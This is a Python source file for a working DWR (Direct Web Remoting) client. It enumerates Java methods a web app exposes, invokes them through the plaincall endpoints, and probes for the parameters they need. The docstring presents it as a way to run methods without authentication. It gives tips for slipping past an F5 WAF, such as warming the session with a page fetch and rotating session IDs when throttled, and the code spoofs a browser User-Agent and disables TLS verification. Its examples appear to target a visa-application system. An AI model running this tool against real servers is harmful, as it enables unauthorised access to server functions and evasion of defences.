#!/usr/bin/env python3
"""
dwr_client.py - working DWR (Direct Web Remoting) v2 client for Java webapps.

WHY THIS EXISTS
  DWR publishes server-side Java methods to the browser. The /dwr/interface/*.js
  stubs are usually public and reveal every method name + arity. The
  /dwr/call/plaincall/ endpoints frequently lack an auth filter, so methods
  execute unauthenticated. This client does the three things that are fiddly:
    1. enumerate interfaces + method signatures from the .js stubs
    2. invoke a method with the exact v2 wire format
    3. parse the JS-literal response (NOT json) and the missing-param errors

USAGE
  # enumerate every method on every interface
  python3 dwr_client.py --base https://TARGET/APP enum

  # call a method (args are JSON)
  python3 dwr_client.py --base https://TARGET/APP call sponsoredapplyDwr getAllVisaTypes '[]'
  python3 dwr_client.py --base https://TARGET/APP call dwrService getOccupation '["1"]'

  # iterative missing-param bootstrap: sends a deliberately-empty body and
  # reports each param the server asks for, one at a time
  python3 dwr_client.py --base https://TARGET/APP probe sponsoredapplyDwr getAllVisaTypes

NOTES
  - scriptSessionId: any UUID usually works for the first calls; if the server
    starts throwing after volume, re-warm the session (GET the hosting page) and
    rotate the UUID.
  - Always GET the page that hosts the interfaces first (--page), so an F5-style
    WAF sees a normal flow instead of a bare POST.
"""
import argparse, json, re, sys, uuid, urllib3
import requests
urllib3.disable_warnings()

DEFAULT_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")


class Dwr:
    def __init__(self, base, page=None, timeout=30):
        self.base = base.rstrip("/")
        self.page = page or (self.base.split("//", 1)[-1].split("/", 1)[-1] or "/")
        self.timeout = timeout
        self.s = requests.Session()
        self.s.verify = False
        self.s.headers.update({"User-Agent": DEFAULT_UA})
        self.sid = str(uuid.uuid4())
        self.batch = 0

    # ---------- interface enumeration ----------
    def interfaces(self, html=None):
        """Find dwr/interface/*.js references on the hosting page."""
        if html is None:
            html = self._warm().text
        found = set(re.findall(r'dwr/interface/([A-Za-z0-9_]+)\.js', html))
        # also allow a caller to pass a guessed list
        return sorted(found)

    def signatures(self, iface):
        """Return [(method, nargs), ...] from the interface stub."""
        r = self.s.get(f"{self.base}/dwr/interface/{iface}.js", timeout=self.timeout)
        out = []
        for m, args in re.findall(r'p\.([A-Za-z0-9_]+)\s*=\s*function\(([^)]*)\)', r.text):
            names = [a.strip() for a in args.split(",") if a.strip() and a.strip() != "callback"]
            out.append((m, len(names)))
        return out

    # ---------- invocation ----------
    def _warm(self):
        return self.s.get(f"{self.base}/{self.page.lstrip('/')}", timeout=self.timeout,
                          headers={"Referer": self.base + "/"})

    def call(self, iface, method, args=None):
        args = args or []
        self.batch += 1
        page_path = "/" + self.page.lstrip("/")
        d = {
            "c0-scriptName": iface,
            "c0-methodName": method,
            "c0-id": "0",
            "c0-p0": json.dumps({"httpMethod": "POST", "script": "null", "pageId": page_path}),
        }
        # c1..cN carry the method arguments. Wire index is positional (1-based),
        # regardless of the java param names (which may skip numbers: p0, p2).
        for i, a in enumerate(args):
            k = i + 1
            d[f"c{k}-scriptName"] = iface
            d[f"c{k}-methodName"] = method
            d[f"c{k}-id"] = "0"
            d[f"c{k}-p0"] = json.dumps(a)
        d["callCount"] = str(len(args) + 1)
        d["batchId"] = str(self.batch)
        d["instanceId"] = "0"
        # NOTE: `page` MUST be URL-encoded (the browser client sends it encoded).
        # Sending it raw yields java.lang.StringIndexOutOfBoundsException
        # ("String index out of range: 4") because the server splits on '/'.
        from urllib.parse import quote
        d["page"] = quote(page_path, safe="")
        d["scriptSessionId"] = self.sid
        d["windowName"] = ""
        url = f"{self.base}/dwr/call/plaincall/{iface}.{method}.dwr"
        r = self.s.post(url, data=d, timeout=self.timeout, headers={
            "Referer": self.base + "/",
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "text/plain",
        })
        return r

    # ---------- response parsing ----------
    @staticmethod
    def parse(text):
        """Return a python object, or a dict describing the error/wrapper."""
        if "Request Rejected" in text or "support ID is" in text:
            return {"__waf__": "F5 BIG-IP ASM rejected the request (see support ID)"}
        m = re.search(r"name:\s*'([^']*)',\s*message:\s*'([^']*)'", text)
        if m:
            return {"__error__": m.group(1), "msg": m.group(2)}
        ex = re.search(r"handleException\([^,]+,\s*[^,]+,\s*\{(.*?)\}\)", text, re.S)
        if ex:
            return {"__exception__": ex.group(1)[:500]}
        cb = re.search(r'handleCallback\(\s*"[^"]*"\s*,\s*"[^"]*"\s*,\s*(.*?)\s*\)\s*;', text, re.S)
        if not cb:
            cb = re.search(r"handleCallback\([^,]+,\s*'[^']*',\s*(.*?)\s*\)\s*;", text, re.S)
        if cb:
            raw = cb.group(1)
            try:
                return json.loads(raw)
            except Exception:
                return js_to_py(raw)
        return {"__raw__": text[:2000]}

    def probe(self, iface, method):
        """Iteratively discover required params by sending an empty arg list."""
        seen = []
        args = []
        for _ in range(8):
            r = self.call(iface, method, args)
            res = self.parse(r.text)
            if isinstance(res, dict) and "__error__" in res:
                mm = re.search(r"Failed to find parameter:\s*([A-Za-z0-9_\-]+)", res.get("msg", ""))
                if mm and mm.group(1) not in seen:
                    seen.append(mm.group(1))
                    print(f"  server wants: {mm.group(1)}")
                    args.append("1")   # placeholder so the next probe advances
                    continue
            print(f"  settled after {len(seen)} hints -> {res}")
            return
        print(f"  still not settled; hints: {seen}")


def js_to_py(raw):
    """Convert a DWR JS object literal to a python object (best effort)."""
    s = raw.strip()
    if s in ("", "null"):
        return None
    s = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), s)
    s = re.sub(r'([{,]\s*)([A-Za-z_][A-Za-z0-9_]*)\s*:', r'\1"\2":', s)  # quote bare keys
    s = re.sub(r"'", '"', s)
    try:
        return json.loads(s)
    except Exception:
        return {"__raw__": raw[:2000]}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True, help="e.g. https://TARGET/APP")
    ap.add_argument("--page", default=None, help="page that hosts the interfaces")
    sub = ap.add_subparsers(dest="cmd", required=True)
    sub.add_parser("enum")
    c = sub.add_parser("call")
    c.add_argument("iface"); c.add_argument("method"); c.add_argument("args")
    p = sub.add_parser("probe")
    p.add_argument("iface"); p.add_argument("method")
    a = ap.parse_args()

    d = Dwr(a.base, a.page)
    if a.cmd == "enum":
        for i in d.interfaces():
            print(f"=== {i}")
            for m, n in d.signatures(i):
                print(f"    {m}  ({n} args)")
    elif a.cmd == "call":
        r = d.call(a.iface, a.method, json.loads(a.args))
        res = d.parse(r.text)
        print(json.dumps(res, indent=1, default=str) if not isinstance(res, str) else res)
    elif a.cmd == "probe":
        d.probe(a.iface, a.method)


if __name__ == "__main__":
    main()
